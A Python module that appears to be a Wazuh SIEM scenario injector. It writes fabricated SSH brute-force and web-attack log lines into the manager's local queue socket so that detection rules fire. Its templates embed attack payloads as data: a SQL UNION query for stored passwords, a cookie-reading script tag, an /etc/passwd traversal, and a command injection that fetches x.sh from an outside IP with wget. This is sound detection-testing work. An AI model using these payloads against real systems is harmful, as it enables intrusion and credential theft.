"""Scenario injector — writes labeled attack events to the analysisd queue socket.

Only event templates whose rules were VERIFIED to fire on the live manager (and
to carry data.srcip, so the attack map / triage sees a source) are included:

  sshd_invalid  -> rule 5710  groups[sshd,authentication_failed]  -> bruteforce
  sshd_failed   -> rule 5716/5710                                 -> bruteforce
  web_sqli      -> rule 31106 groups[web,accesslog,attack]        -> webattack
  web_xss       -> rule 31106                                     -> webattack
  web_traversal -> rule 31106                                     -> webattack
  web_cmdinj    -> rule 31106                                     -> webattack

A message is: `1:[<agentid>] (<agentname>) any-><location>:<raw log line>`.
Everything runs ON the Wazuh manager (the queue socket is a local UNIX socket).
"""
import socket
import threading
import time
import random

import config

USERS = ["admin", "root", "test", "oracle", "ubuntu", "postgres", "git",
         "ftpuser", "deploy", "guest", "support", "www-data"]

_SECURE = "any->/var/log/secure"
_ACCESS = "any->/var/log/apache2/access.log"


def _ts():
    return time.strftime("%b %d %H:%M:%S")


def _apache_ts():
    return time.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _line(template, ip):
    """Build one raw log line for a template + source IP."""
    pid = random.randint(1000, 65000)
    port = random.randint(1024, 65535)
    user = random.choice(USERS)
    host = "srv"
    if template == "sshd_invalid":
        return _SECURE, "%s %s sshd[%d]: Failed password for invalid user %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "sshd_failed":
        return _SECURE, "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (
            _ts(), host, pid, user, ip, port)
    if template == "web_sqli":
        return _ACCESS, '%s - - [%s] "GET /index.php?id=1+UNION+SELECT+username,password+FROM+users HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_xss":
        return _ACCESS, '%s - - [%s] "GET /search?q=<script>document.cookie</script> HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_traversal":
        return _ACCESS, '%s - - [%s] "GET /app?file=../../../../etc/passwd HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    if template == "web_cmdinj":
        return _ACCESS, '%s - - [%s] "GET /ping?host=127.0.0.1;wget+http://45.9.148.3/x.sh HTTP/1.1" 200 %d' % (
            ip, _apache_ts(), random.randint(400, 4000))
    raise ValueError("unknown template: %s" % template)


class Injector:
    """One socket, reused. Thread-safe send with reconnect-on-error."""

    def __init__(self, sock_path=None):
        self.sock_path = sock_path or config.QUEUE_SOCKET
        self._s = None
        self._lock = threading.Lock()

    def _connect(self):
        self._s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self._s.connect(self.sock_path)

    def send(self, agent_id, agent_name, location, raw):
        # location is e.g. "any->/var/log/secure"; final wire msg:
        #   1:[id] (name) any->/path:<raw log>
        msg = "1:[%s] (%s) %s:%s" % (agent_id, agent_name, location, raw)
        with self._lock:
            for attempt in (1, 2):
                try:
                    if self._s is None:
                        self._connect()
                    self._s.send(msg.encode())
                    return
                except OSError:
                    self._s = None
                    if attempt == 2:
                        raise


# --- run tracking (in-memory; a run = one scenario injection) ---
_runs = {}
_runs_lock = threading.Lock()


def run_state(run_id):
    with _runs_lock:
        return dict(_runs.get(run_id, {}))


def _emit_scenario(run_id, scenario, agents):
    inj = Injector()
    steps = scenario.get("inject", {}).get("steps", [])
    total = 0
    for st in steps:
        total += int(st.get("count", 1))
    with _runs_lock:
        _runs[run_id]["total"] = total
    sent = 0
    for st in steps:
        template = st["template"]
        agent_name = st.get("agent") or random.choice(list(agents))
        agent_id = agents.get(agent_name, "000")
        ips = st.get("srcips") or [st.get("srcip")]
        count = int(st.get("count", 1))
        spacing = st.get("spacing", [3, 10])
        for _ in range(count):
            ip = random.choice([i for i in ips if i])
            location, raw = _line(template, ip)
            try:
                inj.send(agent_id, agent_name, location, raw)
            except OSError as e:
                with _runs_lock:
                    _runs[run_id]["error"] = str(e)
                return
            sent += 1
            with _runs_lock:
                _runs[run_id]["sent"] = sent
            time.sleep(random.uniform(float(spacing[0]), float(spacing[1])))
        # gap between steps
        time.sleep(random.uniform(2, 6))
    with _runs_lock:
        _runs[run_id]["done"] = True


def launch(scenario, agents):
    """Start injecting a scenario in the background. Returns a run id."""
    run_id = "%s-%d" % (scenario["id"], int(time.time()))
    with _runs_lock:
        _runs[run_id] = {"scenario": scenario["id"], "sent": 0, "total": 0,
                         "done": False, "started": time.time()}
    t = threading.Thread(target=_emit_scenario, args=(run_id, scenario, agents), daemon=True)
    t.start()
    return run_id
